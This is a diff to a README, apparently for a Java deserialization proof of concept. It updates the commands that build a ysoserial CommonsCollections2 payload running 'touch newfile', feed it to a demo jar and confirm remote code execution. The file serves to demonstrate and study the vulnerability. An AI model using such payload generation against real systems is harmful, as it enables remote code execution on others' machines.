@@ -16,7 +16,7 @@ java -jar ysoserial-all.jar CommonsCollections2 "touch newfile" > CommonsCollect
 
 Demonstrate the exploit with:
 ```
-$JAVA_HOME/bin/java -jar target/ysoserial_poc-1.0-SNAPSHOT-all.jar CommonsCollections2.payload.bi
+$JAVA_HOME/bin/java -jar collections40/target/ysoserial-collections40-1.0-SNAPSHOT-all.jar CommonsCollections2.payload.bin
 ```
 
-Verify that newfile is created, demonstrating RCE.
+Ignore the stacktrace caused by NullPointerException. Verify that newfile is created, demonstrating RCE.
